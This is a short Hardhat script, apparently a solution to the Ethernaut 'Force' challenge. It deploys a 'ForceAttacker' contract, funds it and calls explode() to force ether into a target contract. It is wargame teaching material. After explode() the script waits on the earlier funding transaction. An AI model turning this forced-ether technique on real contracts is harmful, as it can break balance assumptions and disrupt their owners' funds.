import { ethers } from "hardhat";

async function main() {
  const [signer] = await ethers.getSigners();
  const force = await ethers.getContractAt("Force", "0xe6b5Dc6bCE7A8Be8265c3B9efd16a09aE7fd76DE");

  const ForceAttacker = await ethers.getContractFactory("ForceAttacker");
  const forceAttacker = await ForceAttacker.deploy(force.address);
  console.log("attacker deployed at", forceAttacker.address);

  const tx = await signer.sendTransaction({ to: forceAttacker.address, value: "42" });
  await tx.wait(5);

  await forceAttacker.explode();
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
